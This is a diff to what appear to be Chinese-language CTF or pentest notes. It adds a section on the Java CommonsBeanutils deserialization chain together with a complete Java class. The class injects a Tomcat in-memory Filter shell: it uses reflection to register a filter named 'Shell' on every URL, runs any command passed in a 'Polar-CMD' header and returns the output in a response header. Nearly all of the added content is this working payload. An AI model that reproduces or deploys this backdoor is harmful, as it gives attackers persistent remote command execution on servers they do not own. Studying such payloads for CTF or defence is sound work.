@@ -161,7 +161,108 @@ AddHandler application/x-httpd-php.php
 ---
 
 ### CB链
-java反序列化CommonBean链
+java反序列化CommonBean链,不出网
+
+cb链使用类加载器加载恶意类
+
+```java
+package ysoserial.cb;
+
+import javax.servlet.*;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.util.stream.Collectors;
+
+public class Exp implements javax.servlet.Filter{
+    private javax.servlet.http.HttpServletRequest request = null;
+    private org.apache.catalina.connector.Response response = null;
+    private javax.servlet.http.HttpSession session =null;
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+    }
+    public void destroy() {}
+    @Override
+    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
+        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
+        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
+        javax.servlet.http.HttpSession session = request.getSession();
+        String cmd = request.getHeader("Polar-CMD");
+        System.out.println(cmd);
+        if (cmd != null) {
+            //System.out.println("1");
+            response.setHeader("Polar-START", "OK");
+            // 使用 ProcessBuilder 执行命令
+            Process process = new ProcessBuilder(cmd.split("\\s+"))
+                .redirectErrorStream(true)
+                .start();
+            //System.out.println("2");
+            // 获取命令执行的输入流
+            InputStream inputStream = process.getInputStream();
+
+            // 使用 Java 8 Stream 将输入流转换为字符串
+            String result = new BufferedReader(new InputStreamReader(inputStream))
+                .lines()
+                .collect(Collectors.joining(System.lineSeparator()));
+            System.out.println("3");
+            response.setHeader("Polar-RESULT",result);
+
+        } else {
+            filterChain.doFilter(request, response);
+        }
+    }
+
+    public boolean equals(Object obj) {
+        Object[] context=(Object[]) obj;
+        this.session = (javax.servlet.http.HttpSession ) context[2];
+        this.response = (org.apache.catalina.connector.Response) context[1];
+        this.request = (javax.servlet.http.HttpServletRequest) context[0];
+
+        try {
+            dynamicAddFilter(new Exp(),"Shell","/*",request);
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+
+        return true;
+    }
+
+    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
+        javax.servlet.ServletContext servletContext=request.getServletContext();
+        if (servletContext.getFilterRegistration(name) == null) {
+            java.lang.reflect.Field contextField = null;
+            org.apache.catalina.core.ApplicationContext applicationContext =null;
+            org.apache.catalina.core.StandardContext standardContext=null;
+            java.lang.reflect.Field stateField=null;
+            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;
+
+            try {
+                contextField=servletContext.getClass().getDeclaredField("context");
+                contextField.setAccessible(true);
+                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
+                contextField=applicationContext.getClass().getDeclaredField("context");
+                contextField.setAccessible(true);
+                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
+                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
+                stateField.setAccessible(true);
+                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
+                filterRegistration = servletContext.addFilter(name, filter);
+                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
+                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
+                filterStartMethod.setAccessible(true);
+                filterStartMethod.invoke(standardContext, null);
+                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
+            }catch (Exception e){
+            }finally {
+                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
+            }
+        }
+    }
+}
+
+```
 
 
 # reverse
